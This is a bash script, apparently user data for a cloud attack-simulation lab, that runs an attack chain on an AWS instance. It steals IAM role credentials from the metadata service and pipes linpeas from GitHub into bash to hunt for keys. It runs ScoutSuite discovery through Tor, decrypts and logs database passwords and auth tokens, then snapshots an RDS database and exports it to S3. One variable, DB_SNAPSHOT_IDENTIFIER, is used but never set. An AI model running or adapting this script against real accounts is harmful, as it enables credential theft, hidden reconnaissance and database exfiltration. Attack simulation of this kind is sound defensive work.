#!/bin/bash

SCRIPTNAME=instance2rds
LOGFILE=/tmp/$SCRIPTNAME.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
truncate -s 0 $LOGFILE
check_apt() {
  pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
  log "Waiting for apt to be available..."
  sleep 10
done

log "Checking for aws cli..."
while ! which aws > /dev/null; do
    log "aws cli not found or not ready - waiting"
    sleep 120
done
log "aws path: $(which aws)"

log "installing jq..."
apt-get install -y jq

REGION=${region}
ENVIRONMENT=target
DEPLOYMENT=${deployment}

INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)

# create an env file for scoutsuite
log "Building env file with ec2 instance creds..."
cat > .aws-ec2-instance <<-EOF
AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
AWS_DEFAULT_REGION=us-east-1
AWS_DEFAULT_OUTPUT=json
EOF

log "Setting up a instance profile with aws cli"
PROFILE="instance"
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
aws configure set region $REGION --profile=$PROFILE
aws configure set output json --profile=$PROFILE

log "Running: aws sts get-caller-identity --profile=$PROFILE"
aws sts get-caller-identity --profile=$PROFILE >> $LOGFILE 2>&1

# local discovery
log "Running local discovery..."
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex >> $LOGFILE 2>&1
log "done."

# cloud discovery
# log "Running cloud discovery..."
# docker run --rm --name=scoutsuite --env-file=.aws-ec2-instance rossja/ncc-scoutsuite:aws-latest scout aws
# log "done."
# reset docker containers
log "Stopping and removing any existing tor containers..."
docker stop torproxy > /dev/null 2>&1
docker rm torproxy > /dev/null 2>&1
docker stop scoutsuite-tor > /dev/null 2>&1
docker rm scoutsuite-tor > /dev/null 2>&1

# start tor proxy
log "Starting tor proxy..."
docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy

# build scoutsuite proxychains
log "Building proxychains config..."
TORPROXY_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
cat > proxychains.conf <<- EOF
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5  $TORPROXY_IP  9050
EOF
log "Building scoutesuite-tor entrypoint.sh..."
cat > entrypoint.sh <<- EOF
#!/bin/sh
set -e
# Check if the TOR connection is up
while ! proxychains curl -s --connect-timeout 5 http://icanhazip.com 2> /dev/null; do
    echo "Waiting for TOR connection..."
    sleep 5
done
# Run scoutsuite with TOR proxy
proxychains scout "\$${@}"
EOF
chmod +x entrypoint.sh
log "Building scoutesuite-tor Dockerfile..."
cat > Dockerfile <<- EOF
FROM rossja/ncc-scoutsuite:aws-latest
RUN apt-get update && apt-get install -y netcat-openbsd proxychains4 curl
COPY proxychains.conf /etc/proxychains4.conf
COPY entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
EOF
docker build -t scoutsuite-tor .
log "Running scoutesuite-tor with aws discovery..."
docker run --rm --link torproxy:torproxy --env-file=.aws-ec2-instance scoutsuite-tor aws

# opts="--output json"

aws ssm get-parameter --name="db_host" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
aws ssm get-parameter --name="db_name" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
aws ssm get-parameter --name="db_port" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
aws ssm get-parameter --name="db_region" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
aws ssm get-parameter --name="db_username" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1
aws ssm get-parameter --name="db_password" --with-decryption --profile=$PROFILE --region=$REGION >> $LOGFILE 2>&1

log "Getting db connect token..."
DBHOST="$(aws ssm get-parameter --name="db_host" --with-decryption --profile=$PROFILE --region=$REGION $opts| jq -r '.Parameter.Value' | cut -d ":" -f 1)"
DBUSER="$(aws ssm get-parameter --name="db_username" --with-decryption --profile=$PROFILE --region=$REGION $opts | jq -r '.Parameter.Value')"
DBPORT="$(aws ssm get-parameter --name="db_port" --with-decryption --profile=$PROFILE --region=$REGION $opts | jq -r '.Parameter.Value')"
TOKEN="$(aws rds generate-db-auth-token --profile=$PROFILE --hostname $DBHOST --port $DBPORT --region $REGION --username $DBUSER $opts)"
log "Token: $TOKEN"

# connect to mysql database - optional
# curl -LOJ https://s3.amazonaws.com/rds-downloads/rds-combined-ca-bundle.pem
# mysql --host=$DBHOST --port=$DBPORT --ssl-ca=rds-combined-ca-bundle.pem --enable-cleartext-plugin --user=$DBUSER --password=$TOKEN

log "Getting current account number..."
AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')
log "Account Number: $AWS_ACCOUNT_NUMBER"

log "Getting DbInstanceIdentifier..."
DB_INSTANCE_ID=$(aws rds describe-db-instances \
  --profile=$PROFILE \
  --region=$REGION  \
  $opts \
  | jq -r ".DBInstances[] | select(.TagList[] | (.Key == \"environment\" and .Value == \"$ENVIRONMENT\")) | select(.TagList[] | (.Key == \"deployment\" and .Value == \"$DEPLOYMENT\")) | .DBInstanceIdentifier")
log "DbInstanceIdentifier: $DB_INSTANCE_ID"

log "Creating rds snapshot..."
NOW_DATE=$(date '+%Y-%m-%d-%H-%M-%S')
CURRENT_DATE=$(date +%Y-%m-%d)
DB_SNAPSHOT_ARN=$(aws rds create-db-snapshot \
    --profile=$PROFILE  \
    --region=$REGION  \
    --db-instance-identifier $DB_INSTANCE_ID \
    --db-snapshot-identifier snapshot-$ENVIRONMENT-$DEPLOYMENT-$NOW_DATE \
    --tags Key=environment,Value=$ENVIRONMENT Key=deployment,Value=$DEPLOYMENT \
    --query 'DBSnapshot.DBSnapshotArn' \
    --output text)
log "DB Snapshot ARN: $DB_SNAPSHOT_ARN"

log "Waiting for rds snapshot to complete..."
aws rds wait db-snapshot-completed --db-snapshot-identifier $DB_SNAPSHOT_ARN >> $LOGFILE 2>&1
log "RDS snapshot complete."

log "Obtaining the KMS key id..."
for keyId in $(aws kms list-keys --query 'Keys[].KeyId' --profile=$PROFILE --region=$REGION --output json | jq -r '.[]'); do
  echo $keyId
  keyinfo=$(aws kms describe-key --key-id "$keyId" --query 'KeyMetadata' --output json --profile=$PROFILE --region=$REGION 2> /dev/null)
  echo $keyinfo
  enabled=$(echo "$keyinfo" | jq -r '.Enabled')
  echo $enabled
  if [ "$enabled" = "true" ]; then
    TAG_VALUE=$(aws kms list-resource-tags --key-id "$keyId" --profile=$PROFILE --region=$REGION 2> /dev/null | jq -r ".Tags[] | select(.TagKey==\"Name\" and .TagValue==\"db-kms-key-$ENVIRONMENT-$DEPLOYMENT\") | .TagValue")
    echo "Tag: $TAG_VALUE"
    if [ "$TAG_VALUE" == "db-kms-key-$ENVIRONMENT-$DEPLOYMENT" ]; then
      echo "Found: $keyId"
      KMS_KEY_ID=$keyId
      break
    fi
  fi
done
log "KMS Key Id: $KMS_KEY_ID"

log "Obtaining rds export role..."
RDS_EXPORT_ROLE_ARN=$(aws iam list-roles --profile=$PROFILE --region=$REGION  | jq -r ".Roles[] | select(.RoleName==\"rds-s3-export-role-$ENVIRONMENT-$DEPLOYMENT\") | .Arn")
log "RDS export role: $RDS_EXPORT_ROLE_ARN"

log "Exporting rds snapshot to s3..."
EXPORT_TASK_IDENTIFIER="snapshot-export-$ENVIRONMENT-$DEPLOYMENT-$NOW_DATE"
EXPORT_TASK_ARN=$(aws rds start-export-task \
    --profile=$PROFILE  \
    --region=$REGION  \
    --export-task-identifier $EXPORT_TASK_IDENTIFIER \
    --source-arn $DB_SNAPSHOT_ARN \
    --s3-bucket-name db-backup-$ENVIRONMENT-$DEPLOYMENT \
    --s3-prefix "$CURRENT_DATE" \
    --iam-role-arn $RDS_EXPORT_ROLE_ARN \
    --kms-key-id=$KMS_KEY_ID \
    $opts | jq -r '.ExportTasks[0].SourceArn') 
log "Export task arn: $EXPORT_TASK_ARN"
log "Export task identifier: $EXPORT_TASK_IDENTIFIER"

log "Getting snapshot export task status..."
aws rds describe-export-tasks \
    --profile=$PROFILE  \
    --region=$REGION  \
    --export-task-identifier $EXPORT_TASK_IDENTIFIER \
    --source-arn $DB_SNAPSHOT_ARN \
    $opts >> $LOGFILE 2>&1

while true; do
    STATUS=$(aws rds describe-export-tasks --profile=$PROFILE --region=$REGION --export-task-identifier $EXPORT_TASK_IDENTIFIER --source-arn $DB_SNAPSHOT_ARN --query 'ExportTasks[0].Status' --output text)
    if [ "$STATUS" == "COMPLETE" ]; then
        log "Export task completed successfully."
        break
    elif [ "$STATUS" == "FAILED" ]; then
        log "Export task failed."
        exit 1
    else
        log "Export task is still in progress. Current status: $STATUS"
        sleep 60
    fi
done

log "Deleting snapshot..."
aws rds delete-db-snapshot \
    --profile=$PROFILE  \
    --region=$REGION \
    --db-snapshot-identifier $DB_SNAPSHOT_IDENTIFIER \
    $opts >> $LOGFILE 2>&1

log "Done"